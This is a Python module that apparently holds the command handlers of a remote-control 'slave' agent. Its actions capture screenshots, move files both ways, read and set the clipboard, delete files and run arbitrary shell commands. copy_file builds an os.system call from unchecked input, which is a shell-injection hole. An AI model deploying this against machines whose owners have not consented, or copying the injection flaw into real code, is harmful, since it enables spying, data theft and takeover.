
import os
import json
import subprocess
import argparse
import inspect
from data.data_classes import Response, ParamTypes, Action, Param

SLAVE_MAJOR_VERSION = 1
SLAVE_MINOR_VERSION = 0
SLAVE_PATCH_VERSION = 0
SLAVE_VERSION = f"{SLAVE_MAJOR_VERSION}.{SLAVE_MINOR_VERSION}.{SLAVE_PATCH_VERSION}"

def format_message_response(is_success, message):
    function_that_called = inspect.stack()[1].function
    print(f"Function {function_that_called} called") # DEBUG
    action = [action for action in ACTIONS if action.function.__name__ == function_that_called][0]
    return Response(success=is_success, message=message, type=action.response_type, slave_version=SLAVE_VERSION)

def take_screen_shot(_):
    if os.name == 'nt':  # Windows
        import pyautogui
        screenshot = pyautogui.screenshot()
        screenshot.save("screenshot.png")
    else:  # macOS and Linux
        subprocess.run(["screencapture", "screenshot.png"] if os.name == 'posix' and os.uname().sysname == 'Darwin' else ["import", "-window", "root", "screenshot.png"])
    with open("screenshot.png", "rb") as f:
        image = f.read()
    return format_message_response(True, image.decode("latin-1"))

def upload_file(params):
    file_data = params.get("file_data")
    destination_path = params.get("destination_path")
    if not file_data or not destination_path:
        return format_message_response(False, "Invalid parameters")
    with open(destination_path, "wb") as f:
        f.write(file_data.encode("latin-1"))
    return format_message_response(True, f"File uploaded to {destination_path}")

def download_file(params):
    file_name = params.get("file_path")
    if not file_name or not os.path.exists(file_name):
        return format_message_response(False, "File not found")
    with open(file_name, "rb") as f:
        file_data = f.read()
    return format_message_response(True, file_data.decode("latin-1"))

def set_clipboard(params):
    text = params.get("text")
    if not text:
        return format_message_response(False, "Invalid parameters")
    process = subprocess.Popen("pbcopy", env={"LANG": "en_US.UTF-8"}, stdin=subprocess.PIPE)
    process.communicate(text.encode("utf-8"))
    return format_message_response(True, "Clipboard set")

def get_clipboard(_):
    process = subprocess.Popen("pbpaste", stdout=subprocess.PIPE)
    output, _ = process.communicate()
    return format_message_response(True, output.decode("utf-8"))

def list_directory(params):
    directory = params.get("directory")
    if not directory or not os.path.exists(directory):
        return format_message_response(False, "Invalid directory")
    files = os.listdir(directory)
    return format_message_response(True, files)

def rm_file(params):
    file = params.get("file")
    if not file or not os.path.exists(file):
        return format_message_response(False, "Invalid file")
    os.remove(file)
    return format_message_response(True, "File removed")

def copy_file(params):
    source = params.get("source")
    destination = params.get("destination")
    if not source or not destination or not os.path.exists(source):
        return format_message_response(False, "Invalid source or destination")
    os.system(f"cp {source} {destination}")
    return format_message_response(True, "File copied")

def run_command(params):
    command = params.get("command")
    if not command:
        return format_message_response(False, "Invalid command")
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()
    return format_message_response(True, output.decode("utf-8") + error.decode("utf-8"))

ACTIONS = [
    Action(
        name="take_screen_shot",
        params=[],
        response_type=ParamTypes.FILE,
        function=take_screen_shot
    ),
    Action(
        name="upload_file",
        params=[
            Param(name="file_data", type=ParamTypes.FILE),
            Param(name="destination_path", type=ParamTypes.STRING)
        ],
        response_type=ParamTypes.STRING,
        function=upload_file
    ),
    Action(
        name="download_file",
        params=[
            Param(name="file_path", type=ParamTypes.STRING)
        ],
        response_type=ParamTypes.FILE,
        function=download_file
    ),
    Action(
        name="set_clipboard",
        params=[
            Param(name="text", type=ParamTypes.STRING)
        ],
        response_type=ParamTypes.STRING,
        function=set_clipboard
    ),
    Action(
        name="get_clipboard",
        params=[],
        response_type=ParamTypes.STRING,
        function=get_clipboard
    ),
    Action(
        name="list_directory",
        params=[
            Param(name="directory", type=ParamTypes.STRING)
        ],
        response_type=ParamTypes.STRING,
        function=list_directory
    ),
    Action(
        name="rm_file",
        params=[
            Param(name="file", type=ParamTypes.STRING)
        ],
        response_type=ParamTypes.STRING,
        function=rm_file
    ),
    Action(
        name="copy_file",
        params=[
            Param(name="source", type=ParamTypes.STRING),
            Param(name="destination", type=ParamTypes.STRING)
        ],
        response_type=ParamTypes.STRING,
        function=copy_file
    ),
    Action(
        name="run_command",
        params=[
            Param(name="command", type=ParamTypes.STRING)
        ],
        response_type=ParamTypes.STRING,
        function=run_command
    )
]